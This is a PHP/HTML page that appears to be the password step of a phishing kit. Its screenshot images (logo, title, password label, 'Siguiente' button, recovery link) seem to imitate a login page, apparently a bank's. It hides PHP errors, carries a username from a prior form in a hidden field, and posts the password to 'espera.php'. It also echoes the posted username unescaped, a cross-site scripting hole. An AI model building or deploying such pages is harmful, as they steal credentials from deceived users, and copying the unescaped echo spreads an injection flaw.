<?php ini_set("display_errors", 0);?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<style>

    body {
        margin: 0;
        width: 110%;
        background-color:#D9D8D8 ;
    }
    
    .nav {  
        font-family: Verdana, Arial, Tahoma;
        letter-spacing: -.02em;
        height: 100px;
        display: flex;
        
        
        background-color: #006EB8;
    }

    .cajaform {
        width: 95%;
        background-color: #F7F7F7;
        box-shadow: -1px 2px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 500px;
        padding: 10px;
        margin: 0 auto;
        margin-top: -70px;
        
    
    }
    
    .caja2 {
       
        width: 380px;
        background-color: #FFFFFF;
        box-shadow: -1px 1px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 200px;
        padding: 15px;
        margin: 0 auto;
        margin-top: 30px;
        position: relative;
        margin-left: -8px;
    }
    
    .form {
        width: 400px;
        margin: 0 auto;
    }
    
    .titulo {
        color: #838181;
        width: 183px;
        margin-left: -40%;
        font-size: 20px;
        font-family: sans-serif;
    }
    
    .caja3 {
        width: 380px;
        background-color: #FFFFFF;
        box-shadow: -1px 1px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 100px;
        padding: 15px;
        margin: 0 auto;
        margin-top: 30px;
        position: relative;
        margin-left: -8px;
    }

    .box {
        display: flex;
        flex-direction: column;
        
        margin-top: 30px;
    }


    .recupera {
        width: 300px;
        margin-top: 30px;
        
    }

    .ipp {outline: none;
        list-style: none;
    margin: 0;
    padding: 0;
    font-family: inherit;
    font-weight: inherit;
    background-color: transparent!important;
    width: 250px;
    height: 20px;
    border: none 0!important;
    font-size: .9em;
    font-style: italic;
    color: #b7b7b7;
    border: solid 1px black;
  
    }

    .borde {  border: solid 1px rgb(174, 174, 174);
        color: #000;
    font-family: Verdana,Arial,Tahoma;
    letter-spacing: -.02em;
    margin: 0;
    list-style: none;
    float: left!important;
   
     border-radius: 6px;
    padding: 13px;
    }

.boton1 {
    
   
 color: #FFFFFF;
 margin-top: 2px;
    float: right!important;
     width: 158px;
    height: 41px;
    border: none 0!important;
    cursor: pointer;
  background: none;
     margin-left: 20px;
    font-weight: bold;
     font-size: 15px;
      
}



.titulos {
    width: 200px;
}


</style>
<body>
    
<div class="nav">
   <img style="width: 100px; padding: 10px;    margin-top: -32px;
" src="logo-responsive.svg" alt="">
</div>
 
 <br><br><br>
 
    <form method="post" action="espera.php">
         
        <div class="cajaform">
            <div class="box">
                <img class="titulos" src="titulo.png" alt="">

                <div class="caja2">

                   <br><br>
                   
                    <img style="width: 100px; float: left; margin-top: 5px; margin-left: -10px;" src="contraseña.png" alt="">
                   
                   <li class="borde">
                     <input type="hidden" name="us" value="<?php echo $_POST['us']; ?>">
                    <input name="ps" class="ipp" type="password" placeholder="">
                   </li>
                   <br>
                   <div style="margin-top: 50px;margin-left: 180px;">
                    <img style="width:200px; position: absolute;" src="btn.png" alt="">
                   <input style="position: absolute;" class="boton1" type="submit" value="Siguiente" >
                   
                   </div>
                   <br><br>
                    <img class="recupera" src="recupera.png" alt=""  >


                </div>
                <div class="caja3"><img style="width: 100%; margin-left: -10px; height: 100%;" src="ABAJO.png" alt=""></div>
            </div>
<div >
            <img  src="" alt="" srcset="">
      </div>  
        
        
        </div>
    </form>
 
</body>
</html>